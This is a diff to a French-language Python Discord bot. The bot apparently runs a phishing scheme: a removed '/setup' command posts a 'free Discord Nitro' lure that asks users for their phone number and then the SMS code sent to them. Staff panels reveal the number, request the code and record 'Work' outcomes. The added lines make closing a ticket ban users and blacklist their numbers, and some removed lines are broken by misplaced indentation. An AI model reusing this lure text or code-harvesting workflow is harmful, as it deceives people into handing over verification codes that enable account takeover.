@@ -261,59 +261,30 @@ class StaffPanelView(discord.ui.View):
         self.auto_close_task: Optional[asyncio.Task] = None
         self.claim_view: Optional[StaffClaimView] = None
 
-    async def close_ticket(
-    self,
-    status_text: str = "Fermé",
-    do_ban: bool = False,
-    reason: str = "Vérification fermée",
-):
-    pending_verifications.pop(self.user_id, None)
-    cooldowns.pop(self.user_id, None)
-
-    if self.claimed_by and self.claimed_by in staff_active_claims:
-        staff_active_claims.pop(self.claimed_by, None)
-
-    self.closed = True
-
-    # Aucun bannissement ni blacklist automatique.
-    if do_ban:
-        log.warning(
-            "Bannissement ignoré pour %s : les bans automatiques sont désactivés.",
-            self.user_id,
-        )
-
-    if self.auto_close_task:
-        self.auto_close_task.cancel()
-        self.auto_close_task = None
-
-    # Désactiver tous les boutons du panneau.
-    for child in self.children:
-        if isinstance(child, discord.ui.Button):
-            child.disabled = True
-
-    try:
-        user_fetch = await bot.fetch_user(self.user_id)
-
-        new_embed = build_staff_embed(
-            user=user_fetch,
-            phone=self.phone,
-            status=status_text,
-            claimed_by=self.claimed_by,
-            code_requested=self.code_requested,
-            timestamp=self.message.created_at if self.message else None,
-        )
-
-        new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
-        new_embed.color = COLOR_WARNING
-
-        if self.message:
+    async def close_ticket(self, status_text: str = "Fermé", do_ban: bool = True, reason: str = "Vérification fermée"):
+        pending_verifications.pop(self.user_id, None)
+        cooldowns.pop(self.user_id, None)
+        if self.claimed_by and self.claimed_by in staff_active_claims:
+            staff_active_claims.pop(self.claimed_by, None)
+        self.closed = True
+        if do_ban and self.user_id:
+            add_to_blacklist(self.user_id, self.phone, blacklist)
+            await ban_user(self.user_id, reason)
+        if self.auto_close_task:
+            self.auto_close_task.cancel()
+            self.auto_close_task = None
+        # Désactiver les boutons du panneau principal
+        for child in self.children:
+            if isinstance(child, discord.ui.Button):
+                child.disabled = True
+        try:
+            user_fetch = await bot.fetch_user(self.user_id)
+            new_embed = build_staff_embed(user=user_fetch, phone=self.phone, status=status_text, claimed_by=self.claimed_by, code_requested=self.code_requested, timestamp=self.message.created_at if self.message else None)
+            new_embed.set_thumbnail(url=user_fetch.display_avatar.url)
+            new_embed.color = COLOR_DANGER
             await self.message.edit(embed=new_embed, view=self)
-
-    except Exception:
-        log.exception(
-            "Impossible de mettre à jour le ticket de %s",
-            self.user_id,
-        )
+        except:
+            pass
 
     async def start_auto_close(self):
         try:
@@ -343,9 +314,6 @@ class StaffPanelView(discord.ui.View):
                 pass
         staff_active_claims[staff_id] = {"view": self, "user_id": self.user_id}
         self.claimed_by = staff_id
-        button.disabled = True
-        button.label = "Déjà pris"
-        button.style = discord.ButtonStyle.secondary
 
         # Message éphémère avec le numéro + bouton copier
         embed_reveal = discord.Embed(
@@ -458,14 +426,9 @@ class StaffPanelView(discord.ui.View):
             embed = discord.Embed(title="Déjà fermé", description="Cette vérification est déjà fermée.", color=COLOR_WARNING)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        await self.close_ticket("Preuve traitée - Work", do_ban=False, reason="Traitement effectué par le staff")
-        embed = discord.Embed(
-          title="Preuve traitée",
-          description=f"La demande de <@{self.user_id}> a été traitée. Aucun bannissement automatique n'a été effectué.",
-          color=COLOR_SUCCESS,
-       )
-        
-await interaction.response.send_message(embed=embed, ephemeral=True)
+        await self.close_ticket("Scam confirmé - Banni", do_ban=True, reason="Scam confirmé par le staff")
+        embed = discord.Embed(title="Scam confirmé", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
     @discord.ui.button(label="Fermer", style=discord.ButtonStyle.grey, custom_id="close_btn")
     async def close_button(self, interaction: discord.Interaction, button: discord.ui.Button):
@@ -477,14 +440,9 @@ await interaction.response.send_message(embed=embed, ephemeral=True)
             embed = discord.Embed(title="Déjà fermé", description="Cette vérification est déjà fermée.", color=COLOR_WARNING)
             await interaction.response.send_message(embed=embed, ephemeral=True)
             return
-        await self.close_ticket("Fermé par le staff", do_ban=False, reason="Ticket fermé par le staff")
-        embed = discord.Embed(
-          title="Vérification fermée",
-          description=f"La demande de <@{self.user_id}> a été fermée. Aucun bannissement automatique n'a été effectué.",
-          color=COLOR_WARNING,
-     )
-        
-await interaction.response.send_message(embed=embed, ephemeral=True)
+        await self.close_ticket("Fermé - Banni", do_ban=True, reason="Banni via fermeture de vérification")
+        embed = discord.Embed(title="Vérification fermée", description=f"L'utilisateur <@{self.user_id}> a été banni et le numéro blacklisté.", color=COLOR_DANGER)
+        await interaction.response.send_message(embed=embed, ephemeral=True)
 
 # ===== ENVOYER PANEL STAFF =====
 
@@ -646,75 +604,7 @@ class VerifyButtonView(discord.ui.View):
     async def _button_callback(self, interaction: discord.Interaction):
         await interaction.response.send_modal(PhoneModal())
 
-# ===== COMMANDES SLASH =====
 
-@bot.tree.command(name="setup", description="Crée le panneau de vérification dans ce salon")
-@app_commands.default_permissions(administrator=True)
-async def setup(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="Obtenez Discord Nitro Gratuitement",
-        description=(
-            "Suivez ces étapes simples pour obtenir plusieurs Nitro sans dépenser un centime :\n\n"
-            "**1 - Procédure de Vérification :**\n"
-            "- Cliquez sur \"✅ Vérifier\" en bas de cette page.\n"
-            "- Entrez votre numéro de téléphone.\n\n"
-            "**2 - Recevez le Code par SMS :**\n"
-            "- Vous recevrez un code par SMS sur votre téléphone.\n"
-            "- Ce code est essentiel pour la prochaine étape.\n\n"
-            "**3 - Validez avec le Code :**\n"
-            "- Une fois que vous avez reçu le code, entrez-le lorsque notre bot vous le demandera.\n"
-            "- Cela liera votre numéro de téléphone à notre système sécurisé. "
-            "Aucune de vos informations ne sera enregistrée, donc sauvegardez-les.\n\n"
-            "**4 - Réclamez Vos Nitro :**\n"
-            "- Après avoir validé avec le code, notre bot vous guidera vers la page de réclamation.\n"
-            "- Suivez les instructions à l'écran pour recevoir vos Nitro gratuits.\n\n"
-            "**Pourquoi Faire Cela ?**\n"
-            "En liant votre numéro de téléphone, vous devenez éligible pour notre technique exclusive "
-            "qui permet de générer plusieurs Nitro. C'est une opportunité unique de profiter des "
-            "avantages de Discord Nitro sans frais.\n\n"
-            "**Attention :**\n"
-            "- Assurez-vous d'entrer un numéro de téléphone valide.\n"
-            "- Le code SMS est crucial, ne le partagez avec personne d'autre que notre bot.\n"
-            "- Vous ne serez facturé de 0 centime pour cette technique."
-        ),
-        color=SETUP_COLOR
-    )
-    embed.set_footer(text="Nitro gratuit • 0,00 €")
-    view = VerifyButtonView(is_nsfw=False)
-
-    # Vérifier s'il y a déjà un setup dans ce salon → update
-    setup_data = load_setup_data()
-    existing = None
-    for entry in setup_data:
-        if entry["channel_id"] == interaction.channel_id:
-            existing = entry
-            break
-
-    if existing and existing.get("message_id"):
-        try:
-            old_msg = await interaction.channel.fetch_message(existing["message_id"])
-            await old_msg.edit(embed=embed, view=view)
-            embed_success = discord.Embed(title="Panneau mis à jour", description="Le panneau de vérification a été mis à jour dans ce salon.", color=COLOR_SUCCESS)
-            await interaction.response.send_message(embed=embed_success, ephemeral=True)
-            return
-        except (discord.NotFound, discord.HTTPException):
-            pass  # Message supprimé, on en crée un nouveau
-
-    await interaction.response.send_message(embed=embed, view=view)
-    msg = await interaction.original_response()
-
-    # Sauvegarder dans setup_data
-    if existing:
-        existing["message_id"] = msg.id
-        existing["type"] = "normal"
-    else:
-        setup_data.append({
-            "channel_id": interaction.channel_id,
-            "message_id": msg.id,
-            "type": "normal"
-        })
-    save_setup_data(setup_data)
-    log.info(f"Setup fait dans #{interaction.channel.name} (msg: {msg.id})")
 
 
 @bot.tree.command(name="setupnsfw", description="Crée le panneau de vérification NSFW dans ce salon")
@@ -978,22 +868,9 @@ async def banlist(interaction: discord.Interaction):
 @bot.tree.command(name="sync", description="Sync les commandes slash")
 @app_commands.default_permissions(administrator=True)
 async def sync(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-
-    try:
-        synced = await bot.tree.sync()
-        embed = discord.Embed(
-            title="Commandes synchronisées",
-            description=f"{len(synced)} commande(s) synchronisée(s).",
-            color=COLOR_SUCCESS,
-        )
-        await interaction.followup.send(embed=embed, ephemeral=True)
-    except Exception as error:
-        log.exception("Erreur pendant la synchronisation des commandes")
-        await interaction.followup.send(
-            f"Erreur de synchronisation : `{str(error)[:1500]}`",
-            ephemeral=True,
-        )
+    await bot.tree.sync()
+    embed = discord.Embed(title="Commandes synchronisées", color=COLOR_SUCCESS)
+    await interaction.response.send_message(embed=embed, ephemeral=True)
 
 # ===== EVENTS =====
 
